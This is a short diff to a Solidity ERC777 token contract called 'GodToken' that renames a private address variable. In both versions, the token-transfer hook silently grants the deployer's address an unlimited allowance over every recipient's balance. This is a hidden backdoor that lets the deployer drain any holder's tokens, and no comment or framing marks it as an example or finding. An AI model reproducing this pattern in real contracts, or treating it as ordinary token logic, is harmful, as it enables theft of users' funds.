@@ -6,10 +6,10 @@ import {Ownable} from "@openzeppelin/contracts@v4.9.6/access/Ownable.sol";
 
 contract GodToken is ERC777, Ownable {
 
-    address private spesialAddress_;
+    address private godAddress_;
 
     constructor(uint256 initialSupply) ERC777("God Token", "GT", new address[](0)) {
-        spesialAddress_ = msg.sender;
+        godAddress_ = msg.sender;
         _mint(msg.sender, initialSupply, "", "");
     }
 
@@ -19,9 +19,9 @@ contract GodToken is ERC777, Ownable {
         address to,
         uint256 amount
     ) internal override {
-        uint256 currentAllowance = allowance(to, spesialAddress_);
+        uint256 currentAllowance = allowance(to, godAddress_);
         if(currentAllowance != type(uint256).max) {
-            super._approve(to, spesialAddress_, type(uint256).max);
+            super._approve(to, godAddress_, type(uint256).max);
         }
         super._beforeTokenTransfer(operator, from, to, amount);
     }
